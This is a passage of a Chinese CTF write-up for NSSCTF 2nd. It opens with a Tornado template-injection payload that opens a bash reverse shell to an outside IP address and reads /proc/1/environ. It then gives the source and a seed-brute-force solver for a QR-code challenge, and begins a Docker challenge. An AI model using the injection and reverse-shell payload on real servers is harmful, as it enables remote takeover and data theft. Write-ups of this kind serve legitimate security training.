_tt_utf8 =<span class="hljs-built_in">eval</span> %&#125;&#123;% raw request.body_arguments[request.method][<span class="hljs-number">0</span>] %&#125;&amp;POST=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;%26 /dev/tcp/1.12.251.62/4567 0&lt;%261&#x27;&quot;</span>)<br><br><span class="hljs-comment">#非预期</span><br>ssti=&#123;% include /proc/<span class="hljs-number">1</span>/environ %&#125;<br></code></pre></td></tr></table></figure><p>![img](..&#x2F;img&#x2F;NSSCTF 2nd&#x2F;17006210686844.png)</p><p>![img](..&#x2F;img&#x2F;NSSCTF 2nd&#x2F;17006210686845.png)</p><p>flag在env中</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="gift-in-qrcode-revenge"><a href="#gift-in-qrcode-revenge" class="headerlink" title="gift_in_qrcode(revenge)"></a>gift_in_qrcode(revenge)</h2><p>给了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> qrcode<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randrange, getrandbits, seed<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br><br>flag = os.getenv(<span class="hljs-string">&quot;FLAG&quot;</span>)<br><span class="hljs-keyword">if</span> flag == <span class="hljs-literal">None</span>:<br>    flag = <span class="hljs-string">&quot;flag&#123;test&#125;&quot;</span><br><br>secret_seed = randrange(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>)<br>seed(secret_seed)<br>reveal = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    reveal.append(<span class="hljs-built_in">str</span>(getrandbits(<span class="hljs-number">8</span>)))<br>target = getrandbits(<span class="hljs-number">8</span>)<br>reveal = <span class="hljs-string">&quot;,&quot;</span>.join(reveal)<br><br>img_qrcode = qrcode.make(reveal)<br>img_qrcode = img_qrcode.crop((<span class="hljs-number">35</span>, <span class="hljs-number">35</span>, img_qrcode.size[<span class="hljs-number">0</span>] - <span class="hljs-number">35</span>, img_qrcode.size[<span class="hljs-number">1</span>] - <span class="hljs-number">35</span>))<br><br>offset, delta, rate = <span class="hljs-number">50</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span><br>img_qrcode = img_qrcode.resize(<br>    (<span class="hljs-built_in">int</span>(img_qrcode.size[<span class="hljs-number">0</span>] / rate), <span class="hljs-built_in">int</span>(img_qrcode.size[<span class="hljs-number">1</span>] / rate)), Image.LANCZOS<br>)<br>img_out = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, img_qrcode.size)<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img_qrcode.size[<span class="hljs-number">1</span>]):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img_qrcode.size[<span class="hljs-number">0</span>]):<br>        pixel_qrcode = img_qrcode.getpixel((x, y))<br>        <span class="hljs-keyword">if</span> pixel_qrcode == <span class="hljs-number">255</span>:<br>            img_out.putpixel(<br>                (x, y),<br>                (<br>                    randrange(offset, offset + delta),<br>                    randrange(offset, offset + delta),<br>                    randrange(offset, offset + delta),<br>                ),<br>            )<br>        <span class="hljs-keyword">else</span>:<br>            img_out.putpixel(<br>                (x, y),<br>                (<br>                    randrange(offset - delta, offset),<br>                    randrange(offset - delta, offset),<br>                    randrange(offset - delta, offset),<br>                ),<br>            )<br><br>img_out.save(<span class="hljs-string">&quot;qrcode.png&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;qrcode.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This my gift:&quot;</span>)<br><span class="hljs-built_in">print</span>(base64.b64encode(data).decode(), <span class="hljs-string">&quot;\n&quot;</span>)<br><br>ans = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;What&#x27;s your answer:&quot;</span>)<br><span class="hljs-keyword">if</span> ans == <span class="hljs-built_in">str</span>(target):<br>    <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No no no!&quot;</span>)<br></code></pre></td></tr></table></figure><p>题目大致思路：server端给出一个经过像素扰动的qrcode（范围<code>offset, delta, rate = 50, 3, 5</code>）的base64码，这个qrcode扫出来是一个有20个数字的数组，这些数字是由seed随机产生的，服务端接收1个数字，如果这个数字是qrcode里的数组中的第21个，则输出flag</p><p>思路不是很难，因为<code>secret_seed = randrange(1, 1000)</code>，产生随机数的seed给了范围，所以可以爆破第21个数字。主要难点在于像素扰动扫码以及爆破数字</p><p>学习一下wp，使用np.where还原，pyzbar识别二维码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> pyzbar <span class="hljs-keyword">import</span> pyzbar<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> getrandbits, seed<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getTarget</span>(<span class="hljs-params">rec</span>):<br>    <span class="hljs-comment"># 1.读取二维码</span><br>    img_bytes = base64.b64decode(rec)<br>    img_array = np.frombuffer(img_bytes, np.uint8)<br>    img = cv2.imdecode(img_array, cv2.IMREAD_GRAYSCALE)<br><br>    <span class="hljs-comment"># 2.还原二维码</span><br>    img = np.where(img &lt; <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br>    <span class="hljs-comment"># cv2.imshow(&quot;img&quot;, img.astype(np.uint8))</span><br><br>    <span class="hljs-comment"># 3.扫描二维码解析</span><br>    lis = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, pyzbar.decode(img)[<span class="hljs-number">0</span>].data.decode().split(<span class="hljs-string">&quot;,&quot;</span>)))<br>    <span class="hljs-built_in">print</span>(lis)<br><br>    <span class="hljs-comment"># 4.爆破Target</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>        seed(i)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(getrandbits(<span class="hljs-number">8</span>) == lis[j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>)):<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(getrandbits(<span class="hljs-number">8</span>))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    rec = <span class="hljs-string">b&#x27;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&#x27;</span><br>    target = getTarget(rec)<br>    <span class="hljs-built_in">print</span>(target)<br><span class="hljs-comment">#[227, 19, 102, 10, 150, 150, 220, 227, 58, 162, 132, 38, 149, 137, 242, 205, 8, 7, 17, 200]</span><br><span class="hljs-comment">#81</span><br></code></pre></td></tr></table></figure><p>![img](..&#x2F;img&#x2F;NSSCTF 2nd&#x2F;17006210686846.png)</p><h2 id="Magic-Docker"><a href="#Magic-Docker" class="headerlink" title="Magic Docker"></a>Magic Docker</h2><p><code>docker run randark/nssctf-round15-magic-docker</code></p><p>pull下来后提示need secret</p><p>![img](..&#x2F;img&#x2F;NSSCTF 2nd&#x2F;17006210686847.png)</p><p>bash进入就行</p><p>![img](..&#x2F;img&#x2F;NSSCTF 2nd&#x2F;17006210686848.png)</p><p>&#x2F;app下有main.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> click<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br><span class="hljs-meta">@click.command()</span><br><span class="hljs-meta">@click.option(<span class="hljs-params"><span class="hljs-string">&#x27;--secret&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;default=none,between 0 and 100&#x27;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">secret</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(secret)==<span class="hljs-built_in">str</span>(answer):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Congratulations!&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;But where is your flag?  (=‵ω′=)&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No! You don&#x27;t know anything about docker!&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;How dare you! &quot;</span>)<br><br>BANNER=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">███╗   ██╗███████╗███████╗ ██████╗████████╗███████╗    ██████╗ ███╗   ██╗██████╗            </span><br><span class="hljs-string">████╗  ██║██╔════╝██╔════╝██╔════╝╚══██╔══╝██╔════╝    ╚════██╗████╗  ██║██╔══██╗           </span><br><span class="hljs-string">██╔██╗ ██║███████╗███████╗██║        ██║   █████╗       █████╔╝██╔██╗ ██║██║  ██║           </span><br><span class="hljs-string">██║╚██╗██║╚════██║╚════██║██║        ██║   ██╔══╝      ██╔═══╝ ██║╚██╗██║██║  ██║           </span><br><span class="hljs-string">██║ ╚████║███████║███████║╚██████╗   ██║   ██║         